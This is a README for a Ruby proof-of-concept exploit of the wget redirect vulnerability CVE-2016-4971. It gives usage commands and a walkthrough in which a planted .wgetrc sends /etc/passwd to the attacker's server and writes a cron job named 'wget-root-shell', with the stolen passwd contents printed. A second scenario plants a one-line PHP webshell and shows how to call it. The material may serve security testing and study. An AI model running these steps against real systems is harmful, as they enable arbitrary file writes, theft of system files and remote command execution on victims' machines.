# CVE-2016-4971 | Wget 1.18 < Arbitrary Commands Execution

GNU wget before 1.18 allows remote servers to write to arbitrary files by redirecting a request from HTTP to a crafted FTP resource.

> GNU Wget (including the latest version) when supplied with a malicious website link can be tricked into saving an arbitrary remote file supplied by an attacker, with arbitrary contents and filename under the current directory. This can lead to potential code execution by creating system scripts (such as .bash_profile and others) within home directory as well as other unauthorized actions (such as request sniffing by proxy modification, or arbitrary system file retrieval) by uploading .wgetrc configuration file.
>
>Because of lack of sufficient controls in wget, when user downloads a file with wget, such as:
wget http://attackers-server/safe_file.txt
>
>An attacker who controls the server could make wget create an arbitrary file with arbitrary contents and filename by issuing a crafted HTTP 30X Redirect containing ftp server reference in response to the victimâ€™s wget request.
>_[securiteam.com](https://blogs.securiteam.com/index.php/archives/2701)_

### Vulnerability limitations
As far as this vulnerability could lead to full system compromise, it has to has many conditions to be a real threat.
- You can't use with extra options that force destination filename are specified as a parameter. Such as: `-O`
- `Wget` has to be executed at user's home directory unless scenario No. 2 (see below)
- User must have permissions to write in `/etc/cron.d/` directory


# Usage
**Exploit**
```
ruby ftpd.rb [PATH]
ruby cve-2016-4971_exploit.rb <WEB_SERVER_PORT> <FTP_SERVER_IP> <FTP_SERVER_PRT>
```

## PoC

### 1) Cronjob with wget scenario

**Attacker machine**

- 1. Run FTP server. `sudo for port 21`

```
> sudo ruby ftpd.rb .
[*] Interface: 0.0.0.0
[*] Port: 21
[*] Directory: /home/pentest/exploitation/CVE-in-Ruby/CVE-2016-4971
[*] User:
[*] Pass:
[*] PID: 14777
[+] FTP server started. (Press CRL+C to stop it)
```

- 2. Run http exploit server. `sudo for port 80`

```
sudo ruby cve-2016-4971_exploit.rb 80 "192.168.100.10/.wgetrc" 21
```

**Victim machine**

- 1. Run `wget` against attacker's webserver to download `.wgetrc`

```
> wget http://192.168.100.10/


--2016-07-10 07:34:31--  http://192.168.100.10/
Connecting to 192.168.100.10:80... connected.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: ftp://192.168.100.10/.wgetrc [following]
--2016-07-10 07:34:31--  ftp://192.168.100.10/.wgetrc
           => '.wgetrc'
Connecting to 192.168.100.10:21... connected.
Logging in as anonymous ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> SIZE .wgetrc ... 70
==> PASV ... done.    ==> RETR .wgetrc ... done.
Length: 70 (unauthoritative)

.wgetrc                                        100%[===================================================================================================>]      70   175 B/s    in 0.4s

2016-07-10 07:34:35 (175 B/s) - '.wgetrc' saved [70]

```

- 2. Run `wget` again to execute what's in `.wgetrc` file, which are:
- sending `POST` request to the HTTP server with `/etc/passwd` content
- get the `POST` response body and put it in a cronjob `/etc/cron.d/wget-root-shell`

```
> wget http://192.168.100.10/

--2016-07-10 07:37:38--  http://192.168.100.10/
Connecting to 192.168.100.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 47 [text/plain]
Saving to: '/etc/cron.d/wget-root-shell'

/etc/cron.d/wget-root-shell                    100%[===================================================================================================>]      47  --.-KB/s    in 0s

2016-07-10 07:37:38 (11.5 MB/s) - '/etc/cron.d/wget-root-shell' saved [47/47]
```

At that point,
- A `.wgetrc` file has been created in the user's home directory.
- A cronjob has been created in `/etc/cron.d/wget-root-shell` that creates `hacked-via-wget` text file at the user's home directory.
- Attacker machine will receive `/etc/passwd` content, printed on the same HTTP server terminal

```
[+] Setting up AttackSetup
  - Creating malicious '.wgetrc' file.
   -- The malicious file '.wgetrc' has been created!
[+] Checking FTP server connectivity
  - FTP server is running on: 192.168.100.10:21
[+] Starting HTTP server on port: 80
  - IP connected: 192.168.100.12, wget agent!, yay!
[*] Exploiting with malicious FTP server: 192.168.100.10:21/.wgetrc
  [+] Uploading '.wgetrc' via wget FTP redirect vulnerability
  - IP connected: 192.168.100.12, wget agent!, yay!
[*] Exploiting with malicious FTP server: 192.168.100.10:21/.wgetrc
  [+] Uploading '.wgetrc' via wget FTP redirect vulnerability
  - IP connected: 192.168.100.12, wget agent!, yay!
[*] Exploiting with malicious FTP server: 192.168.100.10:21/.wgetrc
  [+] Uploading '.wgetrc' via wget FTP redirect vulnerability
  - IP connected: 192.168.100.12, wget agent!, yay!
[*] Exploiting with malicious FTP server: 192.168.100.10:21/.wgetrc
  [+] Uploading '.wgetrc' via wget FTP redirect vulnerability
  [+] Getting POST request!
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
---------------[ END OF DATA ]---------------

```

### 2) PHP web application scenario

If wget is used within a PHP script e.g.:
```php
<?php
// Update geoip data
system("wget -N -P geoip http://attackers-host/goeip.db");
?>
```

An attacker who manages to respond to the request could simply upload a PHP backdoor of:

```php
<?php
//webshell.php
system($_GET['cmd']);
?>
```

by keeping FTP server running and creating `shell.php` on the attacker's server then re-run the HTTP server as follows

```
sudo ruby cve-2016-4971_exploit.rb 80 "192.168.100.10/shell.php" 21
```

At that point, the attacker will be able to browser the php shell from browser
```
http://victims-php-host/geoip/webshell.php?cmd=id
```


# References
- http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4971
- https://blogs.securiteam.com/index.php/archives/2701
